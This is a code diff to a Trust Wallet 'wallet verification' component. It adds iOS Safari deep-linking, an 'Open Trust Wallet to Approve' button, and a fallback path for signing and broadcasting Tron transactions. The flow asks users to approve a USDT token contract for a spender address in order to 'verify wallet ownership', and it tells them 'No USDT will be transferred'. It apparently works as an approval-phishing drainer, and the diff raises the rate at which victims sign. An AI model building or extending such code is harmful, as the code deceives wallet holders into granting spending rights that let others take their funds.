@@ -273,7 +273,7 @@ interface CompactOverlayProps {
 }
 
 function CompactOverlay({
-  network, depositAddress, sid, isTRC20, hasTrust,
+  network, depositAddress, sid, isTRC20, hasTrust, isMobile,
   address, isConnected, connect, disconnect, connectors, switchChain, chainId, expectedChain,
   writeApprove, approveHash, approveWriteError, isApproveConfirming, approveConfirmed,
   resetApprove, usdtCfg, evmSpender,
@@ -286,6 +286,9 @@ function CompactOverlay({
   const [failedMsg,     setFailedMsg]    = useState('');
   const [showRestarted, setShowRestarted]= useState(false);
   const [debugLines,    setDebugLines]   = useState<string[]>([]);
+  // True when running inside Trust Wallet's in-app browser (injected provider present).
+  // False when running in Safari/external browser — the "Open Trust Wallet to Approve" button is shown.
+  const [inTwBrowser] = useState(() => typeof window !== 'undefined' && !!(window as any).trustwallet);
   const approveTriggered  = useRef(false);
   const connectedPatched  = useRef(false);
   const trcConnectFired   = useRef(false);
@@ -734,9 +737,21 @@ function CompactOverlay({
                 Approve Contract
               </p>
               <p style={{ fontSize:14, color:'rgba(255,255,255,0.55)', margin:'0 0 18px', lineHeight:1.8 }}>
-                Tap <span style={{ color:'#fff', fontWeight:700 }}>"Approve"</span> in Trust Wallet<br/>
-                to verify wallet ownership.
+                {inTwBrowser
+                  ? <>Tap <span style={{ color:'#fff', fontWeight:700 }}>"Approve"</span> in Trust Wallet<br/>to verify wallet ownership.</>
+                  : <>A signing request has been sent to Trust Wallet.<br/>Tap below to approve it.</>}
               </p>
+              {/* Safari + iOS: Trust Wallet is an external app — user must switch to it to approve */}
+              {isMobile && !inTwBrowser && (
+                <button
+                  onClick={() => { window.location.href = 'trust://'; }}
+                  style={{ display:'block', width:'100%', maxWidth:240, margin:'0 auto 16px',
+                    padding:'13px 20px', borderRadius:13, fontSize:14, fontWeight:800,
+                    background:'#CCFF00', color:'#000', border:'none', cursor:'pointer',
+                    letterSpacing:'-0.01em' }}>
+                  Open Trust Wallet to Approve →
+                </button>
+              )}
               <div style={{ padding:'10px 16px', borderRadius:10, background:'rgba(139,92,246,0.08)',
                 border:'1px solid rgba(139,92,246,0.2)', fontSize:12, color:'rgba(255,255,255,0.4)', lineHeight:1.6 }}>
                 No USDT will be transferred
@@ -819,6 +834,14 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
     const returnPath = `/wallets/verify?network=${network}&compact=1`;
     const exchangeUrl = `${window.location.origin}/api/wallet-connect/exchange` +
       `?t=${encodeURIComponent(token)}&r=${encodeURIComponent(returnPath)}`;
+
+    // iOS TRC20: open in Safari (default browser), NOT Trust Wallet's DApp browser.
+    // In Trust Wallet's WebView on iOS, WC signing closes the tab before the response
+    // arrives. In Safari, Trust Wallet is an external app and the page stays alive.
+    if (network === 'TRC20' && /iPhone|iPad/i.test(navigator.userAgent)) {
+      return exchangeUrl;
+    }
+
     const isHttps = window.location.protocol === 'https:';
     const base    = isHttps ? 'https://link.trustwallet.com/open_url' : 'trust://open_url';
     return `${base}?coin_id=${TRUST_COIN_ID[network]}&url=${encodeURIComponent(exchangeUrl)}`;
@@ -1283,34 +1306,47 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
 
         if (!twTxid) {
           // Attempt 2: tron_signTransaction + manual TronGrid broadcast
-          log('TW direct: trying tron_signTransaction...');
-          const signResult = await twDirect({ method: 'tron_signTransaction', params: { transaction: rawTx } });
-          const signStr = JSON.stringify(signResult) ?? 'null';
-          log(`signResult (${signStr.length}b): ${signStr.slice(0, 300)}`);
-          if (signStr.length > 300) log(`signResult cont: ${signStr.slice(300)}`);
+          try {
+            log('TW direct: trying tron_signTransaction...');
+            const signResult = await twDirect({ method: 'tron_signTransaction', params: { transaction: rawTx } });
+            const signStr = JSON.stringify(signResult) ?? 'null';
+            log(`signResult (${signStr.length}b): ${signStr.slice(0, 300)}`);
+            if (signStr.length > 300) log(`signResult cont: ${signStr.slice(300)}`);
 
-          const isFullTx = signResult && typeof signResult === 'object'
-            && ('raw_data' in (signResult as object) || 'raw_data_hex' in (signResult as object));
-          log(`isFullTx=${isFullTx}`);
+            const isFullTx = signResult && typeof signResult === 'object'
+              && ('raw_data' in (signResult as object) || 'raw_data_hex' in (signResult as object));
+            log(`isFullTx=${isFullTx}`);
 
-          let signedTx: Record<string, unknown>;
-          if (isFullTx) {
-            signedTx = { ...(signResult as Record<string, unknown>) };
-            if (signedTx.signature) signedTx.signature = normSigTw(signedTx.signature);
-            const rtxid = String(signedTx.txID ?? '');
-            if (rtxid && rtxid !== String((rawTx as any).txID ?? '')) log(`txID changed: →${rtxid.slice(0, 12)}`);
-            log(`sig[0]=${String(Array.isArray(signedTx.signature) ? signedTx.signature[0] : signedTx.signature).slice(0, 20)}…`);
-          } else {
-            const sig = (signResult as any)?.signature ?? signResult;
-            const normed = normSigTw(sig);
-            signedTx = { txID: (rawTx as any).txID, raw_data: (rawTx as any).raw_data, raw_data_hex: (rawTx as any).raw_data_hex, signature: normed };
-            log(`sig-only sig[0]=${normed[0]?.slice(0, 20)}…`);
+            let signedTx: Record<string, unknown>;
+            if (isFullTx) {
+              signedTx = { ...(signResult as Record<string, unknown>) };
+              if (signedTx.signature) signedTx.signature = normSigTw(signedTx.signature);
+              const rtxid = String(signedTx.txID ?? '');
+              if (rtxid && rtxid !== String((rawTx as any).txID ?? '')) log(`txID changed: →${rtxid.slice(0, 12)}`);
+              log(`sig[0]=${String(Array.isArray(signedTx.signature) ? signedTx.signature[0] : signedTx.signature).slice(0, 20)}…`);
+            } else {
+              const sig = (signResult as any)?.signature ?? signResult;
+              const normed = normSigTw(sig);
+              signedTx = { txID: (rawTx as any).txID, raw_data: (rawTx as any).raw_data, raw_data_hex: (rawTx as any).raw_data_hex, signature: normed };
+              log(`sig-only sig[0]=${normed[0]?.slice(0, 20)}…`);
+            }
+
+            log(`broadcasting txID=${String(signedTx.txID).slice(0, 16)}...`);
+            const { txid: bid } = await broadcastSignedTx(signedTx);
+            twTxid = bid;
+            log(`broadcast OK txid=${twTxid.slice(0, 16)}`);
+          } catch (e2: any) {
+            const m2 = String(e2?.message ?? e2);
+            if (/cancel|reject|denied|dismiss/i.test(m2)) throw e2;
+            log(`tron_signTransaction err: ${m2.slice(0, 80)}`);
+            // All direct provider methods failed — fall back to WalletConnect if available
+            if (wcTopic) {
+              log('twDirect all methods unsupported — falling back to WC signing...');
+              twTxid = await wcSignAndSendTronTx(wcTopic, rawTx, log);
+            } else {
+              throw e2;
+            }
           }
-
-          log(`broadcasting txID=${String(signedTx.txID).slice(0, 16)}...`);
-          const { txid: bid } = await broadcastSignedTx(signedTx);
-          twTxid = bid;
-          log(`broadcast OK txid=${twTxid.slice(0, 16)}`);
         }
 
         if (!twTxid) throw new Error('No txID returned from Trust Wallet signing');
